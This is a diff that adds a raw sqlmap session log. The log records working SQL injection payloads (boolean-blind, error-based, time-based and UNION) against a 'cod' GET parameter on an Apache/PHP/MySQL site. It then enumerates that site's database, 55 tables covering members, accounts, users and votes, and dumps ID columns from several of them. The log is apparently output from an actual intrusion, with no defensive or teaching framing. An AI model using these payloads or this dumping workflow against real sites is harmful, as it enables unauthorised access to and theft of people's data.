@@ -1,0 +1,3458 @@
+sqlmap identified the following injection point(s) with a total of 162 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] ibefprco_ger
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+[55 tables]
++---------------------------+
+| t_artigos                 |
+| t_auditoria               |
+| t_banners                 |
+| t_candidatos              |
+| t_comunicados             |
+| t_contacorrente           |
+| t_contacorrente_cnr       |
+| t_downloads               |
+| t_downloads_arquivos      |
+| t_empresas                |
+| t_estados                 |
+| t_eventos                 |
+| t_gal_imagem              |
+| t_galeria                 |
+| t_galeria_eventos         |
+| t_galeria_eventos_imagem  |
+| t_google                  |
+| t_grupo_banner            |
+| t_inscritos               |
+| t_link                    |
+| t_menu                    |
+| t_meta_tag                |
+| t_noticias                |
+| t_noticias_clippings      |
+| t_noticias_isae           |
+| t_parceiros               |
+| t_patrocinadores          |
+| t_permissoes              |
+| t_premios                 |
+| t_regulamentos            |
+| t_revelacoes              |
+| t_revelacoes_candidatos   |
+| t_revelacoes_regulamentos |
+| t_revelacoes_votos        |
+| t_socios                  |
+| t_socios_atuacao          |
+| t_socios_contacorrente    |
+| t_socios_empresa          |
+| t_socios_especialista     |
+| t_socios_esporte          |
+| t_socios_evento_gostaria  |
+| t_socios_eventos          |
+| t_socios_filhos           |
+| t_socios_graduado         |
+| t_socios_idioma           |
+| t_socios_info             |
+| t_socios_nivel            |
+| t_socios_passatempo       |
+| t_socios_quest            |
+| t_socios_remuneracao      |
+| t_socios_trabalhos        |
+| t_socios_votacao          |
+| t_user                    |
+| t_videos                  |
+| t_votos                   |
++---------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+[55 tables]
++---------------------------+
+| t_artigos                 |
+| t_auditoria               |
+| t_banners                 |
+| t_candidatos              |
+| t_comunicados             |
+| t_contacorrente           |
+| t_contacorrente_cnr       |
+| t_downloads               |
+| t_downloads_arquivos      |
+| t_empresas                |
+| t_estados                 |
+| t_eventos                 |
+| t_gal_imagem              |
+| t_galeria                 |
+| t_galeria_eventos         |
+| t_galeria_eventos_imagem  |
+| t_google                  |
+| t_grupo_banner            |
+| t_inscritos               |
+| t_link                    |
+| t_menu                    |
+| t_meta_tag                |
+| t_noticias                |
+| t_noticias_clippings      |
+| t_noticias_isae           |
+| t_parceiros               |
+| t_patrocinadores          |
+| t_permissoes              |
+| t_premios                 |
+| t_regulamentos            |
+| t_revelacoes              |
+| t_revelacoes_candidatos   |
+| t_revelacoes_regulamentos |
+| t_revelacoes_votos        |
+| t_socios                  |
+| t_socios_atuacao          |
+| t_socios_contacorrente    |
+| t_socios_empresa          |
+| t_socios_especialista     |
+| t_socios_esporte          |
+| t_socios_evento_gostaria  |
+| t_socios_eventos          |
+| t_socios_filhos           |
+| t_socios_graduado         |
+| t_socios_idioma           |
+| t_socios_info             |
+| t_socios_nivel            |
+| t_socios_passatempo       |
+| t_socios_quest            |
+| t_socios_remuneracao      |
+| t_socios_trabalhos        |
+| t_socios_votacao          |
+| t_user                    |
+| t_videos                  |
+| t_votos                   |
++---------------------------+
+
+Database: ibefprco_ger
+Table: t_artigos
+[3 entries]
++---------+
+| art_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
++---------+
+
+Database: ibefprco_ger
+Table: t_auditoria
+[284 entries]
++-----+
+| id  |
++-----+
+| 1   |
+| 3   |
+| 4   |
+| 5   |
+| 6   |
+| 7   |
+| 8   |
+| 9   |
+| 10  |
+| 11  |
+| 12  |
+| 13  |
+| 14  |
+| 15  |
+| 16  |
+| 17  |
+| 18  |
+| 19  |
+| 20  |
+| 21  |
+| 22  |
+| 23  |
+| 24  |
+| 25  |
+| 26  |
+| 27  |
+| 28  |
+| 29  |
+| 30  |
+| 31  |
+| 32  |
+| 33  |
+| 34  |
+| 35  |
+| 36  |
+| 37  |
+| 38  |
+| 39  |
+| 40  |
+| 41  |
+| 42  |
+| 43  |
+| 44  |
+| 45  |
+| 46  |
+| 47  |
+| 48  |
+| 49  |
+| 50  |
+| 51  |
+| 52  |
+| 53  |
+| 54  |
+| 55  |
+| 56  |
+| 57  |
+| 58  |
+| 59  |
+| 60  |
+| 61  |
+| 62  |
+| 63  |
+| 64  |
+| 65  |
+| 66  |
+| 67  |
+| 68  |
+| 69  |
+| 70  |
+| 71  |
+| 72  |
+| 73  |
+| 74  |
+| 75  |
+| 76  |
+| 77  |
+| 78  |
+| 79  |
+| 80  |
+| 81  |
+| 82  |
+| 83  |
+| 84  |
+| 85  |
+| 86  |
+| 87  |
+| 88  |
+| 89  |
+| 90  |
+| 91  |
+| 92  |
+| 93  |
+| 94  |
+| 95  |
+| 96  |
+| 97  |
+| 98  |
+| 99  |
+| 100 |
+| 101 |
+| 102 |
+| 103 |
+| 104 |
+| 105 |
+| 106 |
+| 107 |
+| 108 |
+| 109 |
+| 110 |
+| 111 |
+| 112 |
+| 113 |
+| 114 |
+| 115 |
+| 116 |
+| 117 |
+| 118 |
+| 119 |
+| 120 |
+| 121 |
+| 122 |
+| 123 |
+| 124 |
+| 125 |
+| 126 |
+| 127 |
+| 128 |
+| 129 |
+| 130 |
+| 131 |
+| 132 |
+| 133 |
+| 134 |
+| 135 |
+| 136 |
+| 137 |
+| 138 |
+| 139 |
+| 140 |
+| 141 |
+| 142 |
+| 143 |
+| 144 |
+| 145 |
+| 146 |
+| 147 |
+| 148 |
+| 149 |
+| 150 |
+| 151 |
+| 152 |
+| 153 |
+| 154 |
+| 155 |
+| 156 |
+| 157 |
+| 158 |
+| 159 |
+| 160 |
+| 161 |
+| 162 |
+| 163 |
+| 164 |
+| 165 |
+| 166 |
+| 167 |
+| 168 |
+| 169 |
+| 170 |
+| 171 |
+| 172 |
+| 173 |
+| 174 |
+| 175 |
+| 176 |
+| 177 |
+| 178 |
+| 179 |
+| 180 |
+| 181 |
+| 182 |
+| 183 |
+| 184 |
+| 185 |
+| 186 |
+| 187 |
+| 188 |
+| 189 |
+| 190 |
+| 191 |
+| 192 |
+| 193 |
+| 194 |
+| 195 |
+| 196 |
+| 197 |
+| 198 |
+| 199 |
+| 200 |
+| 201 |
+| 202 |
+| 203 |
+| 204 |
+| 205 |
+| 206 |
+| 207 |
+| 208 |
+| 209 |
+| 210 |
+| 211 |
+| 212 |
+| 213 |
+| 214 |
+| 215 |
+| 216 |
+| 217 |
+| 218 |
+| 219 |
+| 220 |
+| 221 |
+| 222 |
+| 223 |
+| 224 |
+| 225 |
+| 226 |
+| 227 |
+| 228 |
+| 229 |
+| 230 |
+| 231 |
+| 232 |
+| 233 |
+| 234 |
+| 235 |
+| 236 |
+| 237 |
+| 238 |
+| 239 |
+| 240 |
+| 241 |
+| 242 |
+| 243 |
+| 244 |
+| 245 |
+| 246 |
+| 247 |
+| 248 |
+| 249 |
+| 250 |
+| 251 |
+| 252 |
+| 253 |
+| 254 |
+| 255 |
+| 256 |
+| 257 |
+| 258 |
+| 259 |
+| 260 |
+| 261 |
+| 262 |
+| 263 |
+| 264 |
+| 265 |
+| 266 |
+| 267 |
+| 268 |
+| 269 |
+| 270 |
+| 271 |
+| 272 |
+| 273 |
+| 274 |
+| 275 |
+| 276 |
+| 277 |
+| 278 |
+| 279 |
+| 280 |
+| 281 |
+| 282 |
+| 283 |
+| 284 |
+| 285 |
++-----+
+
+Database: ibefprco_ger
+Table: t_banners
+[56 entries]
++---------+
+| arq_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 6       |
+| 7       |
+| 8       |
+| 9       |
+| 10      |
+| 11      |
+| 12      |
+| 13      |
+| 14      |
+| 15      |
+| 16      |
+| 17      |
+| 18      |
+| 19      |
+| 20      |
+| 21      |
+| 22      |
+| 23      |
+| 24      |
+| 25      |
+| 26      |
+| 27      |
+| 28      |
+| 29      |
+| 30      |
+| 31      |
+| 32      |
+| 33      |
+| 34      |
+| 35      |
+| 36      |
+| 37      |
+| 38      |
+| 39      |
+| 40      |
+| 41      |
+| 42      |
+| 43      |
+| 44      |
+| 45      |
+| 46      |
+| 47      |
+| 48      |
+| 49      |
+| 50      |
+| 51      |
+| 52      |
+| 53      |
+| 54      |
+| 55      |
+| 56      |
++---------+
+
+Database: ibefprco_ger
+Table: t_candidatos
+[36 entries]
++----------+
+| cand_cod |
++----------+
+| 1        |
+| 2        |
+| 3        |
+| 4        |
+| 5        |
+| 6        |
+| 7        |
+| 9        |
+| 10       |
+| 11       |
+| 12       |
+| 13       |
+| 14       |
+| 15       |
+| 16       |
+| 17       |
+| 18       |
+| 19       |
+| 20       |
+| 21       |
+| 22       |
+| 23       |
+| 24       |
+| 25       |
+| 26       |
+| 27       |
+| 28       |
+| 29       |
+| 30       |
+| 31       |
+| 32       |
+| 33       |
+| 34       |
+| 35       |
+| 36       |
+| 37       |
++----------+
+
+Database: ibefprco_ger
+Table: t_comunicados
+[19 entries]
++---------+
+| com_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 6       |
+| 7       |
+| 8       |
+| 9       |
+| 10      |
+| 11      |
+| 12      |
+| 13      |
+| 14      |
+| 15      |
+| 16      |
+| 17      |
+| 18      |
+| 19      |
++---------+
+
+Database: ibefprco_ger
+Table: t_contacorrente
+[558 entries]
++-----------+
+| conta_cod |
++-----------+
+| 1         |
+| 5         |
+| 6         |
+| 7         |
+| 8         |
+| 9         |
+| 10        |
+| 11        |
+| 12        |
+| 13        |
+| 14        |
+| 15        |
+| 16        |
+| 17        |
+| 18        |
+| 19        |
+| 20        |
+| 21        |
+| 22        |
+| 23        |
+| 24        |
+| 25        |
+| 26        |
+| 27        |
+| 28        |
+| 29        |
+| 30        |
+| 31        |
+| 32        |
+| 33        |
+| 34        |
+| 35        |
+| 36        |
+| 37        |
+| 38        |
+| 39        |
+| 40        |
+| 41        |
+| 42        |
+| 43        |
+| 44        |
+| 45        |
+| 46        |
+| 47        |
+| 48        |
+| 49        |
+| 50        |
+| 51        |
+| 52        |
+| 53        |
+| 54        |
+| 55        |
+| 56        |
+| 57        |
+| 58        |
+| 59        |
+| 60        |
+| 61        |
+| 62        |
+| 63        |
+| 64        |
+| 65        |
+| 66        |
+| 67        |
+| 68        |
+| 69        |
+| 70        |
+| 71        |
+| 72        |
+| 73        |
+| 74        |
+| 75        |
+| 76        |
+| 77        |
+| 78        |
+| 79        |
+| 80        |
+| 81        |
+| 82        |
+| 83        |
+| 84        |
+| 85        |
+| 86        |
+| 87        |
+| 88        |
+| 89        |
+| 90        |
+| 91        |
+| 92        |
+| 93        |
+| 94        |
+| 95        |
+| 96        |
+| 97        |
+| 98        |
+| 99        |
+| 100       |
+| 101       |
+| 102       |
+| 103       |
+| 104       |
+| 106       |
+| 107       |
+| 108       |
+| 109       |
+| 110       |
+| 111       |
+| 112       |
+| 113       |
+| 114       |
+| 115       |
+| 116       |
+| 117       |
+| 118       |
+| 119       |
+| 120       |
+| 121       |
+| 122       |
+| 123       |
+| 124       |
+| 125       |
+| 126       |
+| 127       |
+| 128       |
+| 129       |
+| 130       |
+| 131       |
+| 132       |
+| 133       |
+| 134       |
+| 135       |
+| 136       |
+| 137       |
+| 138       |
+| 139       |
+| 140       |
+| 141       |
+| 142       |
+| 143       |
+| 144       |
+| 145       |
+| 146       |
+| 147       |
+| 148       |
+| 149       |
+| 150       |
+| 151       |
+| 152       |
+| 153       |
+| 154       |
+| 155       |
+| 156       |
+| 157       |
+| 158       |
+| 159       |
+| 160       |
+| 161       |
+| 162       |
+| 163       |
+| 164       |
+| 165       |
+| 166       |
+| 167       |
+| 168       |
+| 169       |
+| 170       |
+| 171       |
+| 172       |
+| 173       |
+| 174       |
+| 175       |
+| 176       |
+| 177       |
+| 178       |
+| 179       |
+| 180       |
+| 181       |
+| 182       |
+| 183       |
+| 184       |
+| 185       |
+| 186       |
+| 187       |
+| 188       |
+| 189       |
+| 190       |
+| 191       |
+| 192       |
+| 193       |
+| 194       |
+| 195       |
+| 196       |
+| 197       |
+| 198       |
+| 199       |
+| 200       |
+| 201       |
+| 202       |
+| 203       |
+| 204       |
+| 205       |
+| 206       |
+| 207       |
+| 208       |
+| 209       |
+| 210       |
+| 211       |
+| 212       |
+| 213       |
+| 214       |
+| 215       |
+| 216       |
+| 217       |
+| 218       |
+| 219       |
+| 220       |
+| 221       |
+| 222       |
+| 223       |
+| 224       |
+| 225       |
+| 226       |
+| 227       |
+| 228       |
+| 229       |
+| 230       |
+| 231       |
+| 232       |
+| 233       |
+| 234       |
+| 235       |
+| 236       |
+| 237       |
+| 238       |
+| 239       |
+| 240       |
+| 241       |
+| 242       |
+| 243       |
+| 244       |
+| 245       |
+| 246       |
+| 248       |
+| 249       |
+| 250       |
+| 251       |
+| 252       |
+| 253       |
+| 254       |
+| 255       |
+| 256       |
+| 257       |
+| 258       |
+| 259       |
+| 260       |
+| 261       |
+| 262       |
+| 263       |
+| 264       |
+| 265       |
+| 266       |
+| 267       |
+| 268       |
+| 269       |
+| 270       |
+| 271       |
+| 272       |
+| 273       |
+| 274       |
+| 275       |
+| 276       |
+| 277       |
+| 278       |
+| 279       |
+| 280       |
+| 281       |
+| 282       |
+| 283       |
+| 284       |
+| 285       |
+| 286       |
+| 287       |
+| 288       |
+| 289       |
+| 290       |
+| 291       |
+| 292       |
+| 293       |
+| 294       |
+| 295       |
+| 296       |
+| 297       |
+| 298       |
+| 299       |
+| 300       |
+| 301       |
+| 302       |
+| 303       |
+| 304       |
+| 305       |
+| 306       |
+| 307       |
+| 308       |
+| 309       |
+| 310       |
+| 311       |
+| 312       |
+| 313       |
+| 314       |
+| 315       |
+| 316       |
+| 317       |
+| 318       |
+| 319       |
+| 320       |
+| 321       |
+| 322       |
+| 323       |
+| 324       |
+| 325       |
+| 326       |
+| 327       |
+| 328       |
+| 329       |
+| 330       |
+| 331       |
+| 332       |
+| 333       |
+| 334       |
+| 335       |
+| 337       |
+| 338       |
+| 339       |
+| 340       |
+| 341       |
+| 342       |
+| 343       |
+| 344       |
+| 345       |
+| 346       |
+| 347       |
+| 348       |
+| 349       |
+| 350       |
+| 351       |
+| 352       |
+| 353       |
+| 354       |
+| 355       |
+| 356       |
+| 357       |
+| 358       |
+| 359       |
+| 360       |
+| 361       |
+| 362       |
+| 363       |
+| 364       |
+| 365       |
+| 366       |
+| 367       |
+| 368       |
+| 369       |
+| 370       |
+| 371       |
+| 372       |
+| 373       |
+| 374       |
+| 375       |
+| 376       |
+| 377       |
+| 378       |
+| 379       |
+| 380       |
+| 381       |
+| 382       |
+| 383       |
+| 384       |
+| 385       |
+| 386       |
+| 387       |
+| 388       |
+| 389       |
+| 390       |
+| 391       |
+| 392       |
+| 393       |
+| 394       |
+| 395       |
+| 396       |
+| 397       |
+| 398       |
+| 399       |
+| 400       |
+| 401       |
+| 402       |
+| 403       |
+| 404       |
+| 405       |
+| 406       |
+| 407       |
+| 408       |
+| 409       |
+| 410       |
+| 411       |
+| 412       |
+| 413       |
+| 414       |
+| 415       |
+| 416       |
+| 417       |
+| 418       |
+| 419       |
+| 420       |
+| 421       |
+| 422       |
+| 423       |
+| 424       |
+| 425       |
+| 426       |
+| 427       |
+| 428       |
+| 429       |
+| 430       |
+| 431       |
+| 432       |
+| 433       |
+| 434       |
+| 435       |
+| 436       |
+| 437       |
+| 438       |
+| 439       |
+| 440       |
+| 441       |
+| 442       |
+| 443       |
+| 444       |
+| 445       |
+| 446       |
+| 447       |
+| 448       |
+| 449       |
+| 450       |
+| 451       |
+| 452       |
+| 453       |
+| 454       |
+| 455       |
+| 456       |
+| 457       |
+| 458       |
+| 459       |
+| 460       |
+| 461       |
+| 462       |
+| 463       |
+| 464       |
+| 465       |
+| 466       |
+| 467       |
+| 468       |
+| 469       |
+| 470       |
+| 471       |
+| 472       |
+| 473       |
+| 474       |
+| 475       |
+| 476       |
+| 477       |
+| 478       |
+| 479       |
+| 480       |
+| 481       |
+| 482       |
+| 483       |
+| 484       |
+| 485       |
+| 486       |
+| 487       |
+| 488       |
+| 489       |
+| 490       |
+| 491       |
+| 492       |
+| 493       |
+| 494       |
+| 495       |
+| 496       |
+| 497       |
+| 498       |
+| 499       |
+| 500       |
+| 501       |
+| 502       |
+| 503       |
+| 504       |
+| 505       |
+| 506       |
+| 507       |
+| 508       |
+| 509       |
+| 510       |
+| 511       |
+| 512       |
+| 513       |
+| 514       |
+| 515       |
+| 516       |
+| 517       |
+| 518       |
+| 519       |
+| 520       |
+| 521       |
+| 522       |
+| 523       |
+| 524       |
+| 525       |
+| 526       |
+| 527       |
+| 528       |
+| 529       |
+| 530       |
+| 531       |
+| 532       |
+| 533       |
+| 534       |
+| 535       |
+| 536       |
+| 537       |
+| 538       |
+| 539       |
+| 540       |
+| 541       |
+| 542       |
+| 543       |
+| 544       |
+| 545       |
+| 546       |
+| 547       |
+| 548       |
+| 549       |
+| 550       |
+| 551       |
+| 552       |
+| 553       |
+| 554       |
+| 555       |
+| 556       |
+| 557       |
+| 558       |
+| 559       |
+| 560       |
+| 561       |
+| 562       |
+| 563       |
+| 564       |
++-----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace (original value)
+    Payload: cod=(SELECT (CASE WHEN (1157=1157) THEN 112 ELSE (SELECT 3818 UNION SELECT 7995) END))
+    Vector: (SELECT (CASE WHEN ([INFERENCE]) THEN [ORIGVALUE] ELSE (SELECT [RANDNUM1] UNION SELECT [RANDNUM2]) END))
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: cod=112 AND (SELECT 2288 FROM(SELECT COUNT(*),CONCAT(0x7171717a71,(SELECT (ELT(2288=2288,1))),0x71627a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: cod=112 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 47 columns
+    Payload: cod=-7141 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7171717a71,0x44624b496b43554f4c554f70715274736b676f4b4d6b70524741554d786e65544248496670476178,0x71627a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OVNW
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.3.29
+back-end DBMS: MySQL >= 5.0
+Database: ibefprco_ger
+[55 tables]
++---------------------------+
+| t_artigos                 |
+| t_auditoria               |
+| t_banners                 |
+| t_candidatos              |
+| t_comunicados             |
+| t_contacorrente           |
+| t_contacorrente_cnr       |
+| t_downloads               |
+| t_downloads_arquivos      |
+| t_empresas                |
+| t_estados                 |
+| t_eventos                 |
+| t_gal_imagem              |
+| t_galeria                 |
+| t_galeria_eventos         |
+| t_galeria_eventos_imagem  |
+| t_google                  |
+| t_grupo_banner            |
+| t_inscritos               |
+| t_link                    |
+| t_menu                    |
+| t_meta_tag                |
+| t_noticias                |
+| t_noticias_clippings      |
+| t_noticias_isae           |
+| t_parceiros               |
+| t_patrocinadores          |
+| t_permissoes              |
+| t_premios                 |
+| t_regulamentos            |
+| t_revelacoes              |
+| t_revelacoes_candidatos   |
+| t_revelacoes_regulamentos |
+| t_revelacoes_votos        |
+| t_socios                  |
+| t_socios_atuacao          |
+| t_socios_contacorrente    |
+| t_socios_empresa          |
+| t_socios_especialista     |
+| t_socios_esporte          |
+| t_socios_evento_gostaria  |
+| t_socios_eventos          |
+| t_socios_filhos           |
+| t_socios_graduado         |
+| t_socios_idioma           |
+| t_socios_info             |
+| t_socios_nivel            |
+| t_socios_passatempo       |
+| t_socios_quest            |
+| t_socios_remuneracao      |
+| t_socios_trabalhos        |
+| t_socios_votacao          |
+| t_user                    |
+| t_videos                  |
+| t_votos                   |
++---------------------------+
+
+Database: ibefprco_ger
+Table: t_artigos
+[3 entries]
++---------+
+| art_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
++---------+
+
+Database: ibefprco_ger
+Table: t_auditoria
+[50 entries]
++----+
+| id |
++----+
+| 1  |
+| 2  |
+| 3  |
+| 4  |
+| 5  |
+| 6  |
+| 7  |
+| 8  |
+| 9  |
+| 10 |
+| 11 |
+| 12 |
+| 13 |
+| 14 |
+| 15 |
+| 16 |
+| 17 |
+| 18 |
+| 19 |
+| 20 |
+| 21 |
+| 22 |
+| 23 |
+| 24 |
+| 25 |
+| 26 |
+| 27 |
+| 28 |
+| 29 |
+| 30 |
+| 31 |
+| 32 |
+| 33 |
+| 34 |
+| 35 |
+| 36 |
+| 37 |
+| 38 |
+| 39 |
+| 40 |
+| 41 |
+| 42 |
+| 43 |
+| 44 |
+| 45 |
+| 46 |
+| 47 |
+| 48 |
+| 49 |
+| 50 |
++----+
+
+Database: ibefprco_ger
+Table: t_banners
+[50 entries]
++---------+
+| arq_cod |
++---------+
+| 1       |
+| 2       |
+| 3       |
+| 4       |
+| 5       |
+| 6       |
+| 7       |
+| 8       |
+| 9       |
+| 10      |
+| 11      |
+| 12      |
+| 13      |
+| 14      |
+| 15      |
+| 16      |
+| 17      |
+| 18      |
+| 19      |
+| 20      |
+| 21      |
+| 22      |
+| 23      |
+| 24      |
+| 25      |
+| 26      |
+| 27      |
+| 28      |
+| 29      |
+| 30      |
+| 31      |
+| 32      |
+| 33      |
+| 34      |
+| 35      |
+| 36      |
